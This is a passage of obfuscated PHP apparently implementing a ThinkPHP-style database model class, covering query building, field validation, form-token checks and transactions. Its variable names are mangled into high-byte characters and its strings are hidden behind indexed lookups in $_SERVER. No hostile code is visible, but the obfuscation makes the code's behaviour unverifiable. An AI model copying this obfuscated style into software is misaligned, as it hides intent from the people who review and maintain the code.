=== strpos($ËØñå‚ì, $“µ°¨•[287]) && !1 === strpos($ËØñå‚ì, $“µ°¨•[288])) { unset($áÔ‘Ó¹Ö[$“µ°¨•[279]][$ËØñå‚ì]); } } } $this->_options_filter($áÔ‘Ó¹Ö); return $áÔ‘Ó¹Ö; } protected function _options_filter(&$ÇòÜú¼±) { } protected function _parseType(&$‘”¸ù¿‘, $—”ë’›í) { $ÅÓ‘ªÅ¨ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($this->options[$ÅÓ‘ªÅ¨[289]][$ÅÓ‘ªÅ¨[4] . $—”ë’›í])) { $û× â“¹ = strtolower($this->fields[$ÅÓ‘ªÅ¨[256]][$—”ë’›í]); if (!1 !== strpos($û× â“¹, $ÅÓ‘ªÅ¨[290])) { } elseif (!1 === strpos($û× â“¹, $ÅÓ‘ªÅ¨[291]) && !1 !== strpos($û× â“¹, $ÅÓ‘ªÅ¨[292])) { $‘”¸ù¿‘[$—”ë’›í] = intval($‘”¸ù¿‘[$—”ë’›í]); } elseif (!1 !== strpos($û× â“¹, $ÅÓ‘ªÅ¨[293]) || !1 !== strpos($û× â“¹, $ÅÓ‘ªÅ¨[294])) { $‘”¸ù¿‘[$—”ë’›í] = floatval($‘”¸ù¿‘[$—”ë’›í]); } elseif (!1 !== strpos($û× â“¹, $ÅÓ‘ªÅ¨[295])) { $‘”¸ù¿‘[$—”ë’›í] = (bool) $‘”¸ù¿‘[$—”ë’›í]; } } } public function find($àà÷€áï = array()) { $íĞ×³÷Ò =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_numeric($àà÷€áï) || is_string($àà÷€áï)) { $èçÍí¦Å[$this->getPk()] = intval($àà÷€áï); $this->options[$íĞ×³÷Ò[279]] = $èçÍí¦Å; } $this->options[$íĞ×³÷Ò[296]] = 1; $àà÷€áï = $this->_parseOptions(); $ŞÀÉÜ¡ò = $this->db->select($àà÷€áï); if (!1 === $ŞÀÉÜ¡ò) { return !1; } if (empty($ŞÀÉÜ¡ò)) { return null; } $this->data = $ŞÀÉÜ¡ò[0]; $this->_afterFind($this->data, $àà÷€áï); if (!empty($this->options[$íĞ×³÷Ò[297]])) { return $this->returnResult($this->data, $this->options[$íĞ×³÷Ò[297]]); } return $this->data; } protected function _afterFind(&$–üÄÕ®, $æ¡öí¨â) { } protected function returnResult($Û—õ­ò†, $îÊÊ¯°Ê = '') { $»¨È¾Ê´ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($îÊÊ¯°Ê) { if (is_callable($îÊÊ¯°Ê)) { return call_user_func($îÊÊ¯°Ê, $Û—õ­ò†); } switch (strtolower($îÊÊ¯°Ê)) { case $»¨È¾Ê´[298]: return json_encode($Û—õ­ò†); case $»¨È¾Ê´[299]: return xml_encode($Û—õ­ò†); } } return $Û—õ­ò†; } public function parseFieldsMap($Ï»½‘Õ, $ÛşæÛ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¼™Å¯ïÀ => $‰Ÿû¡È) { if ($ÛşæÛ == 1) { if (isset($Ï»½‘Õ[$‰Ÿû¡È])) { $Ï»½‘Õ[$¼™Å¯ïÀ] = $Ï»½‘Õ[$‰Ÿû¡È]; unset($Ï»½‘Õ[$‰Ÿû¡È]); } } else { if (isset($Ï»½‘Õ[$¼™Å¯ïÀ])) { $Ï»½‘Õ[$‰Ÿû¡È] = $Ï»½‘Õ[$¼™Å¯ïÀ]; unset($Ï»½‘Õ[$¼™Å¯ïÀ]); } } } } return $Ï»½‘Õ; } public function setField($Æ›·Åå´, $Óºš×¥š = '') { if (is_array($Æ›·Åå´)) { $£‹®ú¶® = $Æ›·Åå´; } else { $£‹®ú¶®[$Æ›·Åå´] = $Óºš×¥š; } return $this->save($£‹®ú¶®); } public function setAdd($¤„¡÷Şû, $‰·›ÄòÚ = 1) { $„éÍÇò… =& $_SERVER[¥Ÿ©ÒèÌ]; $¸¿€€§ = $¤„¡÷Şû . $„éÍÇò…[300] . $‰·›ÄòÚ; if ($‰·›ÄòÚ < 0) { $¸¿€€§ = $¤„¡÷Şû . $‰·›ÄòÚ; } return $this->setField($¤„¡÷Şû, array($„éÍÇò…[301], $¸¿€€§)); } public function getField($æ¤Û›İ—, $óŸ¢ï¾ = null) { $¢î©»ïÃ =& $_SERVER[¥Ÿ©ÒèÌ]; $áññÕú¶[$¢î©»ïÃ[277]] = $æ¤Û›İ—; $áññÕú¶ = $this->_parseOptions($áññÕú¶); $æ¤Û›İ— = trim($æ¤Û›İ—); if (strpos($æ¤Û›İ—, $¢î©»ïÃ[50])) { if (!isset($áññÕú¶[$¢î©»ïÃ[296]])) { $áññÕú¶[$¢î©»ïÃ[296]] = is_numeric($óŸ¢ï¾) ? $óŸ¢ï¾ : $¢î©»ïÃ[12]; } $¹ƒÃ„£ = $this->db->select($áññÕú¶); if (!empty($¹ƒÃ„£)) { $ñû¶èª§ = explode($¢î©»ïÃ[50], $æ¤Û›İ—); $æ¤Û›İ— = array_keys($¹ƒÃ„£[0]); $¶¦‡Äëë = array_shift($æ¤Û›İ—); $İå‡ûÀß = array_shift($æ¤Û›İ—); $ÃÍ¾İÆ› = array(); $§´¢ôÚ• = count($ñû¶èª§); foreach ($¹ƒÃ„£ as $ßº Ò’) { $¢§šİ°õ = $ßº Ò’[$¶¦‡Äëë]; if (2 == $§´¢ôÚ•) { $ÃÍ¾İÆ›[$¢§šİ°õ] = $ßº Ò’[$İå‡ûÀß]; } else { $ÃÍ¾İÆ›[$¢§šİ°õ] = is_string($óŸ¢ï¾) ? implode($óŸ¢ï¾, $ßº Ò’) : $ßº Ò’; } } return $ÃÍ¾İÆ›; } } else { if (!0 !== $óŸ¢ï¾) { $áññÕú¶[$¢î©»ïÃ[296]] = is_numeric($óŸ¢ï¾) ? $óŸ¢ï¾ : 1; } if ($óŸ¢ï¾ === $¢î©»ïÃ[259]) { unset($áññÕú¶[$¢î©»ïÃ[296]]); } $ßº Ò’ = $this->db->select($áññÕú¶); if (!empty($ßº Ò’)) { if ($óŸ¢ï¾ === $¢î©»ïÃ[259]) { return reset($ßº Ò’[0]); } if (!0 !== $óŸ¢ï¾ && 1 == $áññÕú¶[$¢î©»ïÃ[296]]) { return reset($ßº Ò’[0]); } foreach ($ßº Ò’ as $àè¥ñ‘à) { $ÆôÑÁÎí[] = $àè¥ñ‘à[$æ¤Û›İ—]; } return $ÆôÑÁÎí; } } return null; } public function create($¿ÇİÈ“¥ = '', $Ê„ÅÜÜ¥ = '') { $‡Î¿­°» =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($¿ÇİÈ“¥)) { $¿ÇİÈ“¥ = $_POST; } elseif (is_object($¿ÇİÈ“¥)) { $¿ÇİÈ“¥ = get_object_vars($¿ÇİÈ“¥); } if (empty($¿ÇİÈ“¥) || !is_array($¿ÇİÈ“¥)) { $this->error = think_lang($‡Î¿­°»[275]); return !1; } $¿ÇİÈ“¥ = $this->parseFieldsMap($¿ÇİÈ“¥, 0); $Ê„ÅÜÜ¥ = $Ê„ÅÜÜ¥ ? $Ê„ÅÜÜ¥ : (!empty($¿ÇİÈ“¥[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‡Î¿­°»[277]])) { $†îıäƒ’ = $this->options[$‡Î¿­°»[277]]; unset($this->options[$‡Î¿­°»[277]]); } elseif ($Ê„ÅÜÜ¥ == THINK_MODEL_INSERT && isset($this->insertFields)) { $†îıäƒ’ = $this->insertFields; } elseif ($Ê„ÅÜÜ¥ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $†îıäƒ’ = $this->updateFields; } if (isset($†îıäƒ’)) { if (is_string($†îıäƒ’)) { $†îıäƒ’ = explode($‡Î¿­°»[50], $†îıäƒ’); } if (think_config($‡Î¿­°»[302])) { $†îıäƒ’[] = think_config($‡Î¿­°»[303]); } foreach ($¿ÇİÈ“¥ as $üë´ ¨è => $ß¹¶«š—) { if (!in_array($üë´ ¨è, $†îıäƒ’)) { unset($¿ÇİÈ“¥[$üë´ ¨è]); } } } if (!$this->autoValidation($¿ÇİÈ“¥, $Ê„ÅÜÜ¥)) { return !1; } if (!$this->autoCheckToken($¿ÇİÈ“¥)) { $this->error = think_lang($‡Î¿­°»[304]); return !1; } if ($this->autoCheckFields) { $†îıäƒ’ = $this->getDbFields(); foreach ($¿ÇİÈ“¥ as $üë´ ¨è => $ß¹¶«š—) { if (!in_array($üë´ ¨è, $†îıäƒ’)) { unset($¿ÇİÈ“¥[$üë´ ¨è]); } elseif (MAGIC_QUOTES_GPC && is_string($ß¹¶«š—)) { $¿ÇİÈ“¥[$üë´ ¨è] = stripslashes($ß¹¶«š—); } } } $this->autoOperation($¿ÇİÈ“¥, $Ê„ÅÜÜ¥); $this->data = $¿ÇİÈ“¥; return $¿ÇİÈ“¥; } public function autoCheckToken($¢•ŞÔˆÎ) { $œÅ®½ëè =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($this->options[$œÅ®½ëè[305]]) && !$this->options[$œÅ®½ëè[305]]) { return !0; } if (think_config($œÅ®½ëè[302])) { $¸ÊµŒ° = think_config($œÅ®½ëè[303]); if (!isset($¢•ŞÔˆÎ[$¸ÊµŒ°]) || Session::get($¸ÊµŒ°)) { return !1; } list($Õñ¾í†è, $òÕ±¤Ï°) = explode($œÅ®½ëè[11], $¢•ŞÔˆÎ[$¸ÊµŒ°]); if ($òÕ±¤Ï° && Session::get($¸ÊµŒ° . $œÅ®½ëè[10] . $Õñ¾í†è) === $òÕ±¤Ï°) { Session::remove($¸ÊµŒ° . $œÅ®½ëè[10] . $Õñ¾í†è); return !0; } if (think_config($œÅ®½ëè[306])) { Session::remove($¸ÊµŒ° . $œÅ®½ëè[10] . $Õñ¾í†è); } return !1; } return !0; } public function regex($²ÎšŒâ©, $Èü‰»„¦) { $øùï…úà =& $_SERVER[¥Ÿ©ÒèÌ]; $‡àËıÜº = array($øùï…úà[307] => $øùï…úà[308], $øùï…úà[309] => $øùï…úà[310], $øùï…úà[311] => $øùï…úà[312], $øùï…úà[313] => $øùï…úà[314], $øùï…úà[315] => $øùï…úà[316], $øùï…úà[317] => $øùï…úà[318], $øùï…úà[319] => $øùï…úà[320], $øùï…úà[294] => $øùï…úà[321], $øùï…úà[322] => $øùï…úà[323]); if (isset($‡àËıÜº[strtolower($Èü‰»„¦)])) { $Èü‰»„¦ = $‡àËıÜº[strtolower($Èü‰»„¦)]; } return preg_match($Èü‰»„¦, $²ÎšŒâ©) === 1; } private function autoOperation(&$¨æ©·ªÀ, $œÑüØ½¸) { $‡¿Õ•¦† =& $_SERVER[¥Ÿ©ÒèÌ]; if (!empty($this->options[$‡¿Õ•¦†[324]])) { $“’“£ˆÅ = $this->options[$‡¿Õ•¦†[324]]; unset($this->options[$‡¿Õ•¦†[324]]); } elseif (!empty($this->_auto)) { $“’“£ˆÅ = $this->_auto; } if (isset($“’“£ˆÅ)) { foreach ($“’“£ˆÅ as $¦Øü¶œŸ) { if (empty($¦Øü¶œŸ[2])) { $¦Øü¶œŸ[2] = THINK_MODEL_INSERT; } if ($œÑüØ½¸ == $¦Øü¶œŸ[2] || $¦Øü¶œŸ[2] == THINK_MODEL_BOTH) { switch (trim($¦Øü¶œŸ[3])) { case $‡¿Õ•¦†[325]: case $‡¿Õ•¦†[326]: $»÷óÚßş = isset($¦Øü¶œŸ[4]) ? (array) $¦Øü¶œŸ[4] : array(); if (isset($¨æ©·ªÀ[$¦Øü¶œŸ[0]])) { array_unshift($»÷óÚßş, $¨æ©·ªÀ[$¦Øü¶œŸ[0]]); } if ($‡¿Õ•¦†[325] == $¦Øü¶œŸ[3]) { $¨æ©·ªÀ[$¦Øü¶œŸ[0]] = call_user_func_array($¦Øü¶œŸ[1], $»÷óÚßş); } else { $¨æ©·ªÀ[$¦Øü¶œŸ[0]] = call_user_func_array(array(&$this, $¦Øü¶œŸ[1]), $»÷óÚßş); } break; case $‡¿Õ•¦†[277]: $¨æ©·ªÀ[$¦Øü¶œŸ[0]] = $¨æ©·ªÀ[$¦Øü¶œŸ[1]]; break; case $‡¿Õ•¦†[327]: if ($‡¿Õ•¦†[12] === $¨æ©·ªÀ[$¦Øü¶œŸ[0]]) { unset($¨æ©·ªÀ[$¦Øü¶œŸ[0]]); } break; case $‡¿Õ•¦†[328]: default: $¨æ©·ªÀ[$¦Øü¶œŸ[0]] = $¦Øü¶œŸ[1]; } if (!1 === $¨æ©·ªÀ[$¦Øü¶œŸ[0]]) { unset($¨æ©·ªÀ[$¦Øü¶œŸ[0]]); } } } } return $¨æ©·ªÀ; } protected function autoValidation($â×óÚÌÒ, $ğ®£¤˜í) { $º”ÖàÑœ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!empty($this->options[$º”ÖàÑœ[329]])) { $‘õ‰¦çü = $this->options[$º”ÖàÑœ[329]]; unset($this->options[$º”ÖàÑœ[329]]); } elseif (!empty($this->_validate)) { $‘õ‰¦çü = $this->_validate; } if (isset($‘õ‰¦çü)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‘õ‰¦çü as $µÙ±¼Ï¹ => $øÉ´·‘¾) { if (empty($øÉ´·‘¾[5]) || $øÉ´·‘¾[5] == THINK_MODEL_BOTH || $øÉ´·‘¾[5] == $ğ®£¤˜í) { if (0 == strpos($øÉ´·‘¾[2], $º”ÖàÑœ[330]) && strpos($øÉ´·‘¾[2], $º”ÖàÑœ[331])) { $øÉ´·‘¾[2] = think_lang(substr($øÉ´·‘¾[2], 2, -1)); } $øÉ´·‘¾[3] = isset($øÉ´·‘¾[3]) ? $øÉ´·‘¾[3] : THINK_EXISTS_VALIDATE; $øÉ´·‘¾[4] = isset($øÉ´·‘¾[4]) ? $øÉ´·‘¾[4] : $º”ÖàÑœ[332]; switch ($øÉ´·‘¾[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($â×óÚÌÒ, $øÉ´·‘¾)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($º”ÖàÑœ[12] != trim($â×óÚÌÒ[$øÉ´·‘¾[0]])) { if (!1 === $this->_validationField($â×óÚÌÒ, $øÉ´·‘¾)) { return !1; } } break; default: if (isset($â×óÚÌÒ[$øÉ´·‘¾[0]])) { if (!1 === $this->_validationField($â×óÚÌÒ, $øÉ´·‘¾)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ú¢´”…ü, $¡ëûÑ¹) { if (!1 === $this->_validationFieldItem($ú¢´”…ü, $¡ëûÑ¹)) { if ($this->patchValidate) { $this->error[$¡ëûÑ¹[0]] = $¡ëûÑ¹[2]; } else { $this->error = $¡ëûÑ¹[2]; return !1; } } return; } protected function _validationFieldItem($ùÀÌ“ğ , $“˜ç¤ë) { $´±ª¤„É =& $_SERVER[¥Ÿ©ÒèÌ]; switch (strtolower(trim($“˜ç¤ë[4]))) { case $´±ª¤„É[325]: case $´±ª¤„É[326]: $´ŒğøÓ = isset($“˜ç¤ë[6]) ? (array) $“˜ç¤ë[6] : array(); if (is_string($“˜ç¤ë[0]) && strpos($“˜ç¤ë[0], $´±ª¤„É[50])) { $“˜ç¤ë[0] = explode($´±ª¤„É[50], $“˜ç¤ë[0]); } if (is_array($“˜ç¤ë[0])) { foreach ($“˜ç¤ë[0] as $Ä±üâÔ…) { $í¤½·˜Ï[$Ä±üâÔ…] = $ùÀÌ“ğ [$Ä±üâÔ…]; } array_unshift($´ŒğøÓ, $í¤½·˜Ï); } else { array_unshift($´ŒğøÓ, $ùÀÌ“ğ [$“˜ç¤ë[0]]); } if ($´±ª¤„É[325] == $“˜ç¤ë[4]) { return call_user_func_array($“˜ç¤ë[1], $´ŒğøÓ); } else { return call_user_func_array(array(&$this, $“˜ç¤ë[1]), $´ŒğøÓ); } case $´±ª¤„É[333]: return $ùÀÌ“ğ [$“˜ç¤ë[0]] == $ùÀÌ“ğ [$“˜ç¤ë[1]]; case $´±ª¤„É[334]: if (is_string($“˜ç¤ë[0]) && strpos($“˜ç¤ë[0], $´±ª¤„É[50])) { $“˜ç¤ë[0] = explode($´±ª¤„É[50], $“˜ç¤ë[0]); } $€äòÉÂù = array(); if (is_array($“˜ç¤ë[0])) { foreach ($“˜ç¤ë[0] as $Ä±üâÔ…) { $€äòÉÂù[$Ä±üâÔ…] = $ùÀÌ“ğ [$Ä±üâÔ…]; } } else { $€äòÉÂù[$“˜ç¤ë[0]] = $ùÀÌ“ğ [$“˜ç¤ë[0]]; } if (!empty($ùÀÌ“ğ [$this->getPk()])) { $€äòÉÂù[$this->getPk()] = array($´±ª¤„É[335], $ùÀÌ“ğ [$this->getPk()]); } if ($this->where($€äòÉÂù)->find()) { return !1; } return !0; default: return $this->check($ùÀÌ“ğ [$“˜ç¤ë[0]], $“˜ç¤ë[1], $“˜ç¤ë[4]); } } public function check($ãÔÏÁÁ¡, $¾Î³ŠÌ‚, $Ñ¿ÎıÙ÷ = "\162\x65\x67\x65\170") { $ò€şÎ¼ç =& $_SERVER[¥Ÿ©ÒèÌ]; $Ñ¿ÎıÙ÷ = strtolower(trim($Ñ¿ÎıÙ÷)); switch ($Ñ¿ÎıÙ÷) { case $ò€şÎ¼ç[7]: case $ò€şÎ¼ç[336]: $š…è®÷º = is_array($¾Î³ŠÌ‚) ? $¾Î³ŠÌ‚ : explode($ò€şÎ¼ç[50], $¾Î³ŠÌ‚); return $Ñ¿ÎıÙ÷ == $ò€şÎ¼ç[7] ? in_array($ãÔÏÁÁ¡, $š…è®÷º) : !in_array($ãÔÏÁÁ¡, $š…è®÷º); case $ò€şÎ¼ç[337]: case $ò€şÎ¼ç[338]: if (is_array($¾Î³ŠÌ‚)) { $ÀÉöç«à = $¾Î³ŠÌ‚[0]; $ÂÍ§ÜäĞ = $¾Î³ŠÌ‚[1]; } else { list($ÀÉöç«à, $ÂÍ§ÜäĞ) = explode($ò€şÎ¼ç[50], $¾Î³ŠÌ‚); } return $Ñ¿ÎıÙ÷ == $ò€şÎ¼ç[337] ? $ãÔÏÁÁ¡ >= $ÀÉöç«à && $ãÔÏÁÁ¡ <= $ÂÍ§ÜäĞ : $ãÔÏÁÁ¡ < $ÀÉöç«à || $ãÔÏÁÁ¡ > $ÂÍ§ÜäĞ; case $ò€şÎ¼ç[339]: case $ò€şÎ¼ç[340]: return $Ñ¿ÎıÙ÷ == $ò€şÎ¼ç[339] ? $ãÔÏÁÁ¡ == $¾Î³ŠÌ‚ : $ãÔÏÁÁ¡ != $¾Î³ŠÌ‚; case $ò€şÎ¼ç[341]: $Ñ¢œ·Åá = mb_strlen($ãÔÏÁÁ¡, $ò€şÎ¼ç[342]); if (strpos($¾Î³ŠÌ‚, $ò€şÎ¼ç[50])) { list($ÀÉöç«à, $ÂÍ§ÜäĞ) = explode($ò€şÎ¼ç[50], $¾Î³ŠÌ‚); return $Ñ¢œ·Åá >= $ÀÉöç«à && $Ñ¢œ·Åá <= $ÂÍ§ÜäĞ; } else { return $Ñ¢œ·Åá == $¾Î³ŠÌ‚; } case $ò€şÎ¼ç[343]: list($¥ÄÑóïÏ, $¢¥ğ¬¡Ä) = explode($ò€şÎ¼ç[50], $¾Î³ŠÌ‚); if (!is_numeric($¥ÄÑóïÏ)) { $¥ÄÑóïÏ = strtotime($¥ÄÑóïÏ); } if (!is_numeric($¢¥ğ¬¡Ä)) { $¢¥ğ¬¡Ä = strtotime($¢¥ğ¬¡Ä); } return NOW_TIME >= $¥ÄÑóïÏ && NOW_TIME <= $¢¥ğ¬¡Ä; case $ò€şÎ¼ç[344]: return in_array(get_client_ip(), explode($ò€şÎ¼ç[50], $¾Î³ŠÌ‚)); case $ò€şÎ¼ç[345]: return !in_array(get_client_ip(), explode($ò€şÎ¼ç[50], $¾Î³ŠÌ‚)); case $ò€şÎ¼ç[332]: default: return $this->regex($ãÔÏÁÁ¡, $¾Î³ŠÌ‚); } } public function query($»•£ŞÛ«, $à“êä§Õ = false) { $‚’’† £ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_bool($à“êä§Õ) && !is_array($à“êä§Õ)) { $à“êä§Õ = func_get_args(); array_shift($à“êä§Õ); } $»•£ŞÛ« = str_replace(array($‚’’† £[226], $‚’’† £[346]), $‚’’† £[53], $»•£ŞÛ«); $»•£ŞÛ« = $this->parseSql($»•£ŞÛ«, $à“êä§Õ); return $this->db->query($»•£ŞÛ«); } public function execute($ü³ì÷´, $µƒøÅ’ = false) { if (!is_bool($µƒøÅ’) && !is_array($µƒøÅ’)) { $µƒøÅ’ = func_get_args(); array_shift($µƒøÅ’); } $ü³ì÷´ = $this->parseSql($ü³ì÷´, $µƒøÅ’); return $this->db->execute($ü³ì÷´); } protected function parseSql($©Á×„´Ç, $¾Ôää²) { $¤–Ğü¤İ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!0 === $¾Ôää²) { $®Š»ôĞ… = $this->_parseOptions(); $©Á×„´Ç = $this->db->parseSql($©Á×„´Ç, $®Š»ôĞ…); } elseif (is_array($¾Ôää²)) { $¾Ôää² = array_map(array($this->db, $¤–Ğü¤İ[347]), $¾Ôää²); $©Á×„´Ç = vsprintf($©Á×„´Ç, $¾Ôää²); } else { $©Á×„´Ç = strtr($©Á×„´Ç, array($¤–Ğü¤İ[348] => $this->getTableName(), $¤–Ğü¤İ[349] => think_config($¤–Ğü¤İ[248]))); } $this->db->setModel($this->name); return $©Á×„´Ç; } public function db($Ûê¼³Å = '', $”–ÖØ½– = '', $¤û³ñ“À = array()) { $ÆÌ’ÊÆß =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ÆÌ’ÊÆß[12] === $Ûê¼³Å && $this->db) { return $this->db; } static $îÏ×ÕÂß = array(); static $æ¡©…ï¨ = array(); if (!isset($æ¡©…ï¨[$Ûê¼³Å]) || isset($æ¡©…ï¨[$Ûê¼³Å]) && $”–ÖØ½– && $îÏ×ÕÂß[$Ûê¼³Å] != $”–ÖØ½–) { if (!empty($”–ÖØ½–) && is_string($”–ÖØ½–) && !1 === strpos($”–ÖØ½–, $ÆÌ’ÊÆß[8])) { $”–ÖØ½– = think_config($”–ÖØ½–); } $Ûê¼³Å = think_guid($”–ÖØ½–); $æ¡©…ï¨[$Ûê¼³Å] = Db::getInstance($”–ÖØ½–); } elseif (NULL === $”–ÖØ½–) { $æ¡©…ï¨[$Ûê¼³Å]->close(); unset($æ¡©…ï¨[$Ûê¼³Å]); return; } if (!empty($¤û³ñ“À)) { if (is_string($¤û³ñ“À)) { parse_str($¤û³ñ“À, $¤û³ñ“À); } foreach ($¤û³ñ“À as $äçÙ¸¡Á => $Ìê‹ÆÇ) { $this->setProperty($äçÙ¸¡Á, $Ìê‹ÆÇ); } } $îÏ×ÕÂß[$Ûê¼³Å] = $”–ÖØ½–; $this->db = $æ¡©…ï¨[$Ûê¼³Å]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ı™·è = get_class($this); if ($ı™·è == $_SERVER[¥Ÿ©ÒèÌ][350]) { return $this->name; } $this->name = substr($ı™·è, 0, -5); } return $this->name; } public function getTableName() { $âöŞ—õÏ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($this->trueTableName)) { $ÈÏÈ¦ = !empty($this->tablePrefix) ? $this->tablePrefix : $âöŞ—õÏ[12]; if (!empty($this->tableName)) { $ÈÏÈ¦ .= $this->tableName; } else { $ÈÏÈ¦ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÈÏÈ¦); } return (!empty($this->dbName) ? $this->dbName . $âöŞ—õÏ[10] : $âöŞ—õÏ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÛšŞç =& $_SERVER[¥Ÿ©ÒèÌ]; return isset($this->fields[$ÛšŞç[255]]) ? $this->fields[$ÛšŞç[255]] : $this->pk; } public function getDbFields() { $½š£Ú‹ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($this->options[$½š£Ú‹[283]])) { $“Şšê— = $this->db->getFields($this->options[$½š£Ú‹[283]]); return $“Şšê— ? array_keys($“Şšê—) : !1; } if ($this->fields) { $“Şšê— = $this->fields; unset($“Şšê—[$½š£Ú‹[254]], $“Şšê—[$½š£Ú‹[255]], $“Şšê—[$½š£Ú‹[256]], $“Şšê—[$½š£Ú‹[253]]); return $“Şšê—; } return !1; } public function data($²ÙšÓÀ™ = '') { $©¬¹×˜¾ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($©¬¹×˜¾[12] === $²ÙšÓÀ™ && !empty($this->data)) { return $this->data; } if (is_object($²ÙšÓÀ™)) { $²ÙšÓÀ™ = get_object_vars($²ÙšÓÀ™); } elseif (is_string($²ÙšÓÀ™)) { parse_str($²ÙšÓÀ™, $²ÙšÓÀ™); } elseif (!is_array($²ÙšÓÀ™)) { think_exception(think_lang($©¬¹×˜¾[275])); } $this->data = $²ÙšÓÀ™; return $this; } public function join($„‹õëëâ) { $§…Ø¬Ğó =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_array($„‹õëëâ)) { $this->options[$§…Ø¬Ğó[286]] = $„‹õëëâ; } elseif (!empty($„‹õëëâ)) { $this->options[$§…Ø¬Ğó[286]][] = $„‹õëëâ; } return $this; } public function union($¹¶‡Şôà, $ª´Ş§İ” = false) { $ŠäŞ¦ÈÈ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($¹¶‡Şôà)) { return $this; } if ($ª´Ş§İ”) { $this->options[$ŠäŞ¦ÈÈ[351]][$ŠäŞ¦ÈÈ[352]] = !0; } if (is_object($¹¶‡Şôà)) { $¹¶‡Şôà = get_object_vars($¹¶‡Şôà); } if (is_string($¹¶‡Şôà)) { $æçô¨ú† = $¹¶‡Şôà; } elseif (is_array($¹¶‡Şôà)) { if (isset($¹¶‡Şôà[0])) { $this->options[$ŠäŞ¦ÈÈ[351]] = array_merge($this->options[$ŠäŞ¦ÈÈ[351]], $¹¶‡Şôà); return $this; } else { $æçô¨ú† = $¹¶‡Şôà; } } else { think_exception(think_lang($ŠäŞ¦ÈÈ[275])); } $this->options[$ŠäŞ¦ÈÈ[351]][] = $æçô¨ú†; return $this; } public function cache($ª°´†¼İ = true, $± ö£¥÷ = null, $ÜßÕ¹·Ô = '') { $—ƒšÁ›· =& $_SERVER[¥Ÿ©ÒèÌ]; if (!1 !== $ª°´†¼İ) { $this->options[$—ƒšÁ›·[353]] = array($—ƒšÁ›·[95] => $ª°´†¼İ, $—ƒšÁ›·[343] => $± ö£¥÷, $—ƒšÁ›·[33] => $ÜßÕ¹·Ô); } return $this; } public function field($è¿ú°¼Ê, $š‘¬ç” = false) { $‡»˜ÕÅ¢ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!0 === $è¿ú°¼Ê) { $İÂşı ñ = $this->getDbFields(); $è¿ú°¼Ê = $İÂşı ñ ? $İÂşı ñ : $‡»˜ÕÅ¢[181]; } elseif ($š‘¬ç”) { if (is_string($è¿ú°¼Ê)) { $è¿ú°¼Ê = explode($‡»˜ÕÅ¢[50], $è¿ú°¼Ê); } $İÂşı ñ = $this->getDbFields(); $è¿ú°¼Ê = $İÂşı ñ ? array_diff($İÂşı ñ, $è¿ú°¼Ê) : $è¿ú°¼Ê; } $this->options[$‡»˜ÕÅ¢[277]] = $è¿ú°¼Ê; return $this; } public function scope($ÅÁ½’Œ· = '', $“€Œ˜œä = NULL) { $é§èåÜä =& $_SERVER[¥Ÿ©ÒèÌ]; if ($é§èåÜä[12] === $ÅÁ½’Œ·) { if (isset($this->_scope[$é§èåÜä[37]])) { $šÑºòä‹ = $this->_scope[$é§èåÜä[37]]; } else { return $this; } } elseif (is_string($ÅÁ½’Œ·)) { $Ûú‰¢È = explode($é§èåÜä[50], $ÅÁ½’Œ·); $šÑºòä‹ = array(); foreach ($Ûú‰¢È as $ÁºñÉ™¨) { if (!isset($this->_scope[$ÁºñÉ™¨])) { continue; } $šÑºòä‹ = array_merge($šÑºòä‹, $this->_scope[$ÁºñÉ™¨]); } if (!empty($“€Œ˜œä) && is_array($“€Œ˜œä)) { $šÑºòä‹ = array_merge($šÑºòä‹, $“€Œ˜œä); } } elseif (is_array($ÅÁ½’Œ·)) { $šÑºòä‹ = $ÅÁ½’Œ·; } if (is_array($šÑºòä‹) && !empty($šÑºòä‹)) { $this->options = array_merge($this->options, array_change_key_case($šÑºòä‹)); } return $this; } public function where($ç¡¥¬¯˜, $®Àç¤¹§ = null) { $Æ¹ïÈË¡ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_null($®Àç¤¹§) && is_string($ç¡¥¬¯˜)) { if (!is_array($®Àç¤¹§)) { $®Àç¤¹§ = func_get_args(); array_shift($®Àç¤¹§); } $®Àç¤¹§ = array_map(array($this->db, $Æ¹ïÈË¡[347]), $®Àç¤¹§); $ç¡¥¬¯˜ = vsprintf($ç¡¥¬¯˜, $®Àç¤¹§); } elseif (is_object($ç¡¥¬¯˜)) { $ç¡¥¬¯˜ = get_object_vars($ç¡¥¬¯˜); } elseif (is_array($ç¡¥¬¯˜)) { foreach ($ç¡¥¬¯˜ as $¤¯¡ëÌ => $ú„Ğ±ãé) { if ((is_numeric($¤¯¡ëÌ) || !$¤¯¡ëÌ) && is_string($ú„Ğ±ãé)) { if (strpos($ú„Ğ±ãé, $Æ¹ïÈË¡[354]) === 0) { continue; } think_trace($Æ¹ïÈË¡[355], $Æ¹ïÈË¡[12], $Æ¹ïÈË¡[49]); die; } } } if 